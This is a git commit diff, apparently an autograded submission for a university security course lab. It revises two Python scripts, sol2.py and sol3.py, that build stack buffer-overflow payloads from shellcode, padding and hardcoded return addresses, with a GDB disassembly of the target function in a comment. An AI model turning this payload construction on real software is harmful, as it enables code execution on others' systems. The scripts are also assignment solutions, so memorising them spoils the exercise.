f259efc93c39bda4073ebd26555b199d47d6b93d
eecs388 <krachit@umich.edu>
2023-03-27 21:46:06 +0000

    Automatic commit by test script for krachit vkaushik

--- sol2.py
+++ sol2.py
@@ -1,16 +1,5 @@
 from shellcode import shellcode
 import sys
 
-# Padding based on the function's stack frame
-padding = b'A' * (0x6c - len(shellcode))
-
-# Address of the vulnerable function (use the value obtained from GDB)
-return_address = 0xffffd858
-
-payload = shellcode + padding + return_address.to_bytes(4, 'little')
-
-sys.stdout.buffer.write(payload)
-
-# from shellcode import shellcode
-# import sys
-# sys.stdout.buffer.write(shellcode)
+execute = shellcode + b'0' * (0x70 - len(shellcode)) + (0xfff6cbfc).to_bytes(4, 'little')
+sys.stdout.buffer.write(execute)
--- sol3.py
+++ sol3.py
@@ -1,19 +1,32 @@
+# Dump of assembler code for function vulnerable:
+#    0x08048bf5 <+0>:     push   ebp
+#    0x08048bf6 <+1>:     mov    ebp,esp
+#    0x08048bf8 <+3>:     push   ebx
+#    0x08048bf9 <+4>:     sub    esp,0x814
+#    0x08048bff <+10>:    call   0x8048c8d <__x86.get_pc_thunk.ax>
+#    0x08048c04 <+15>:    add    eax,0x953fc
+#    0x08048c09 <+20>:    sub    esp,0x4
+#    0x08048c0c <+23>:    push   0x808
+#    0x08048c11 <+28>:    push   DWORD PTR [ebp+0x8]
+#    0x08048c14 <+31>:    lea    edx,[ebp-0x810]
+#    0x08048c1a <+37>:    push   edx
+#    0x08048c1b <+38>:    mov    ebx,eax
+#    0x08048c1d <+40>:    call   0x8048210
+#    0x08048c22 <+45>:    add    esp,0x10
+#    0x08048c25 <+48>:    mov    eax,DWORD PTR [ebp-0xc]
+#    0x08048c28 <+51>:    mov    edx,DWORD PTR [ebp-0x10]
+#    0x08048c2b <+54>:    mov    DWORD PTR [eax],edx
+#    0x08048c2d <+56>:    nop
+
 from shellcode import shellcode
-import struct
+import sys
 
-# Replace this with your shellcode
+# ATTEMPT 1
+#0xfff6cc68
+padding = b'A' * 1995
+a_address = 0xfff6cbdc  # Replace maybeeeeee
 
-# Padding to reach the saved EBP
-padding = b'A' * 2060
+shells = a_address + 4 + 4
 
-# Get the address of the 'a' variable
-a_address = 0xffffd0dc  # Replace with the correct address
-
-# Get the address of the shellcode
-shellcode_address = a_address + 4 + 4  # 4 bytes for the saved EBP, 4 bytes for the saved EIP
-
-# Prepare the exploit string
-exploit = padding + struct.pack('<I', a_address) + struct.pack('<I', shellcode_address) + shellcode
-
-# Print the exploit string
-print(exploit.decode('ISO-8859-1'))
+exploit = shellcode + padding + a_address.to_bytes(4, 'little') + shells.to_bytes(4, 'little')
+sys.stdout.buffer.write(exploit)
